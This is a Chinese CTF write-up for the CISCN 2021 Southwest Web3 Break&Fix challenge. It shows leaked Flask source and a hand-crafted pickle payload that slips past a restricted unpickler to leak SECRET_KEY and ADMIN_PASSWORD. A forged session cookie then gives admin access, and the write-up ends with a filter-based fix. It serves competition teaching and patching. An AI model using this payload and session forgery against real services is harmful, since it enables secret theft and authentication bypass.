# CISCN 2021 西南分区赛 Web3 Break&Fix WriteUp


## 0x00 前言

一次体验还可以的线下，一共就出了两个 Web 题还都是一血就很开心，由于 Web1 过于简单 (sqlmap 一把梭了)，而 Web2 由于前半部分没有做出来，仅仅对其后半部分 ([还原 PHP mt_rand 种子](/posts/php-mt_rand-break/)) 进行了分析，这里就只具体分析一下 Web3



## 0x01 Break

### 源码泄露及分析

扫目录发现 `/backup` 打开发现源码泄露

```python
from flask import Flask, request, session, render_template, url_for
import pickle
import io
import sys
import base64
from settings import SECRET_KEY, User, ADMIN_PASSWORD

app = Flask(__name__)
app.config.update(dict(
    SECRET_KEY=SECRET_KEY,
))
app.config.from_envvar('FLASKR_SETTINGS', silent=True)



class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        # Only allow safe classes
        if module in ['settings'] and "__" not in name:
            return getattr(sys.modules[module], name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))


def restricted_loads(s):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(s)).load()

# index
@app.route('/')
@app.route('/index')
def index():
    if session.get('logged_in', None):
        name = session.get('name')
        if name == 'admin':
            return render_template('index.html', msg=open('/flag').read())
    else:
        session['logged_in'] = 0
        session['name'] = 'Anonymous'
        msg = '<img src="' + url_for('static', filename='img/1.jpeg') + '"><br>Please Login First, {} '

    return render_template('index.html', msg=msg.format(session.get('name')))


# load
@app.route('/load')
def loads():
    data = request.args.get('data', '')
    if data:
        Haha = restricted_loads(base64.b64decode(data))
        assert isinstance(Haha, User)
        if Haha.password == ADMIN_PASSWORD:
            return render_template('index.html', msg=Haha.msg)
        return render_template('index.html', msg="<img src='" + url_for('static', filename='img/2.jpeg') + "'><br>给👴🏻爬")
    return render_template('index.html', msg="<img src='" + url_for('static', filename='img/2.jpeg') + "'><br>儒 雅 随 和")



@app.route('/backup')
def hint():
    return open(__file__, 'rb').read()

if __name__ == '__main__':
    app.run(host='0.0.0.0',debug=False,port=5001)
```

看源码发现两个值得注意的地方，第一个地方是 `index` 函数中通过 `session` 判断身份，若 `session['name']` 的值为 `admin` 则输出 `flag`，猜测需要 flask session 伪造，那么就需要知道 `SECRET_KEY` 的值，第二个地方是 `loads` 函数中存在 pickle 反序列化，查看 `RestrictedUnpickler` 类发现 `find_class` 限制 `module` 必须为 `settings` 而 `name` 中不能含有 `__`，而 `return render_template('index.html', msg=Haha.msg)` 处存在一个可控的输出点

分析之后我们的做题逻辑就很清晰，第一步通过 pickle 反序列化泄露 `SECRET_KEY`，第二步伪造 session 输出 flag



### pickle 反序列化

> 对于 pickle 反序列化的介绍在这篇文章中：[Python pickle 反序列化安全简述](/posts/python-pickle-unserialize/)

正如上文说的，V0 版本的序列化数据会 500，现场分析了一下默认版本 V4 的字节码然后手改了一下然后过了，这里写一下我手改 V4 版本序列化数据的过程，也算是一个分析 pickle 序列化数据的示例

首先写一个测试用的 `User` 类

```python
# settings.py
class User:
    def __init__(self):
        self.password = "password"
        self.msg = "msg"

# app.py
from settings import User
import pickle
print(pickle.dumps(User()))
```

并得到反序列化数据

```
\x80\x04\x952\x00\x00\x00\x00\x00\x00\x00\x8c\x08settings\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(\x8c\x08password\x94h\x05\x8c\x03msg\x94h\x06ub.
```

对其进行简单分析

- `\x80\x04\x952\x00\x00\x00\x00\x00\x00\x00` 为版本描述和创建 frame（总的来说就是初始化

- `\x8c\x08settings\x94` 入栈字符串并放入内存中，其中 `\x8c` 为入栈短字符串操作符，`\x08` 为字符串长度 (故最长 256 字节)，后面跟字符串，`\x94` 将栈顶元素放入 memo 中 (索引为递增的 1-byte 数字)

  `\x8c\x04User\x94` `\x8c\x08password\x94` `\x8c\x03msg\x94` 同理

  > pickle 默认将栈中变量放入 memo 中，也可以不放

- `\x93` 与 `c` 操作符作用相同，区别在于 `c` 操作符参数需要传入，`\x93` 操作符使用栈顶两个元素作为参数，如这里 `\x8c\x08settings\x94\x8c\x04User\x94\x93\x94` 即获取 `settings.User`

- `\x81` 与 `o` 和 `i` 作用相同，可用于创建类的实例，但是调用 `__new__` 方法创建，使用栈顶两个参数，栈顶参数为所调用参数，需要为 tuple，后一个参数为一个类对象，如这里 `\x8c\x08settings\x94\x8c\x04User\x94\x93\x94)\x81\x94` 即调用了 `settings.User.__new__()` 创建了一个 `settings.User` 的实例

- `}\x94(\x8c\x08password\x94h\x05\x8c\x03msg\x94h\x06ub` 大部分用到的操作码都介绍过，这里 `h\x05` 和 `h\x06` 获取到的就是前边刚放入的 'password' 和 'msg' 字符串，这一部分即创建一个 dict： `{'password': 'password', 'msg': 'msg'}`，然后作为参数通过 `b` 操作码更新前面创建的实例

分析到这里各部分的作用都已经很清晰了，而我们要做的很简单，就是把最后创建的 dict 中两个值 `h\x05` `h\x06` 分别换为 `settings.ADMIN_PASSWORD` 和 `settings.SECRET_KEY`，即最后创建的 dict 为 `{'password': settings.ADMIN_PASSWORD, 'msg': settings.SECRET_KEY}`

这里我选择用了比较 V4 的方法获取，以获取 `settings.ADMIN_PASSWORD` 为例，我使用了 `\x8c\x08settings\x94\x8c\x0eADMIN_PASSWORD\x94\x93\x94` （其实就是把获取 `settings.User` 时候的操作码拿过来改一下

最终得到非常 V4 的序列化数据如下

```
\x80\x04\x952\x00\x00\x00\x00\x00\x00\x00\x8c\x08settings\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(\x8c\x08password\x94\x8c\x08settings\x94\x8c\x0eADMIN_PASSWORD\x94\x93\x94\x8c\x03msg\x94\x8c\x08settings\x94\x8c\nSECRET_KEY\x94\x93\x94ub.
```

base64 encode 一下传进去就可以拿到 SECRET_KEY 了



### session 伪造

这一步就非常简单了，用这个库 [Flask Session Cookie Decoder/Encoder](https://github.com/noraj/flask-session-cookie-manager) 解一下 Cookie 中的 session 得到

```
{"logged_in":0,"name":"Anonymous"}
```

修改成如下数据然后再用上述库和上一步得到的 SECRET_KEY 得到新的 session 值

```
{"logged_in":1,"name":"admin"}
```

替换掉 Cookie 中的 session 访问 `/index` 即可得到 flag



## 0x02 Fix

这题 Fix 的思路就非常简单了

源码的第 19~20 行是对反序列化进行限制的主要部分，限制了 `module` 和 `name`，只需要在 if 里加一个条件过滤掉 `SECRET_KEY` 和 `ADMIN_PASSWORD` 即可，即将第 19 行改为如下代码

```python
if module in ['settings'] and "__" not in name and name not in ['SECRET_KEY', 'ADMIN_PASSWORD']:
```



## 0x03 后记

这次比赛感觉 Web 题整体偏难，全场也只有 Web1 和 Web3 有解，可能是因为断网的原因吧，网一断确实就不会做题了（x

但是整体比赛体验还是很不错的，除了泥电宾馆会议室那个破空调是真的不行，打个比赛差点没中暑，强烈吐槽

哦，还有零食太少了，建议决赛来个零食大礼包


